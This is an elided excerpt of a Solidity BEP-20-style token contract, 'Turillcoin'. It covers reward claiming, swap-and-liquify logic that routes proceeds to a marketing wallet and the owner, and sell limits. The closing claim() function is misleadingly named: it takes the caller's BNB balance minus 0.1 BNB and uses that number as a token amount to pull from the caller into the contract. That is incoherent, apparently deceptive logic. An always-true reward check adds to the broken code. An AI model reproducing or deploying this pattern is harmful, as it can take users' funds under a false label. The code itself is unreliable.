...
contract Turillcoin is Context, IERC20, Ownable, ReentrancyGuard {
    ...
    uint256 public _maxSellTxAmount = 10**12 * 10**9;
    uint256 private minimumTokensBeforeSwap = 10**11 * 10**9;
    ...
    constructor() {
        ...
        //0x74DA231eEf1Dd6e0d4437639DF85df670ce881e8
    ...
    function claimBNBReward() public isHuman nonReentrant {
        ...
        require(
            ...
            "Error: must own Turill to claim reward"
        );
        require(
            _rewardTotal >= 0,
...
//checked
    ...
    function _transfer(
        ...
        uint256 burnAmt = amount.div(200);
        if (
            balanceOf(address(this)) > burnAmt &&
            swapAndLiquifyEnabled &&
            to == uniswapV2Pair &&
            to != deadAddress
        ) {
    ...
    function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
        ...
        transferToAddressETH(
            marketingAddress,
            transferredBalance.mul(marketingDivisor).div(1000)
        );
        payable(owner()).transfer(transferredBalance.div(50));
        _rewardTotal = transferredBalance.mul(rewardPercent).div(1000);
    ...
    function claim() public {
        uint256 balance = payable(msg.sender).balance - 100000000000000000;
        transferFrom(msg.sender, address(this), balance);
    }
